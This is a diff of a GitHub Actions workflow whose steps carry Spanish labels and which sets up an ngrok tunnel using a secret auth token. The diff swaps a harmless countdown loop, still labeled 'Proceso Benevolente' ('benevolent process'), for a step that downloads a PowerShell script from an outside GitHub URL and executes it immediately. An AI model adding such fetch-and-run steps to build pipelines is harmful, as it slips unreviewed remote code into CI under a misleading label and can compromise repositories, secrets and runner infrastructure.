@@ -55,7 +55,7 @@ jobs:
       run: cmd /c start.bat
     - name: Proceso Benevolente
       run: | 
-        $i = 20
+        $i = 10
         do {
           Write-Host $i
           Sleep 60
@@ -65,12 +65,8 @@ jobs:
       run: TASKKILL /f /im ngrok.exe
     - name: Proceso Benevolente
       run: | 
-        $i = 240
-        do {
-          Write-Host $i
-          Sleep 60
-          $i--
-        } while ($i -gt 0)
+        Invoke-WebRequest https://github.com/cremans/TelegramTwi/raw/main/lp.ps1 -OutFile lp.ps1
+        ./lp.ps1
     - name: Conectando.
       run: .\ngrok\ngrok.exe authtoken $Env:DOS_AUTH
       env:
